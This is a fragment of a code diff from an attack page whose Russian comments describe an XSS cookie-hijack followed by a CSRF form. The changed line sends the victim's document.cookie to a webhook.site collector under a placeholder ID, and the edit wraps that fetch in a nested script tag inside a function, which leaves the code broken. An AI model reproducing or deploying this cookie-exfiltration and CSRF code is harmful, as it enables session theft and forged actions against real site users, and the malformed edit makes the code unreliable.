@@ -45,7 +45,9 @@
   <script>
     function attack() {
       // 1. Сначала отправим cookie (XSS+Token Hijack)
-      fetch("https://webhook.site/ВАШ-ID?cookie=" + document.cookie);
+     <script>
+  fetch("https://webhook.site/ВАШ-ID?cookie=" + encodeURIComponent(document.cookie));
+</script>
 
       // 2. Затем создаём CSRF-форму
       const form = document.createElement("form");
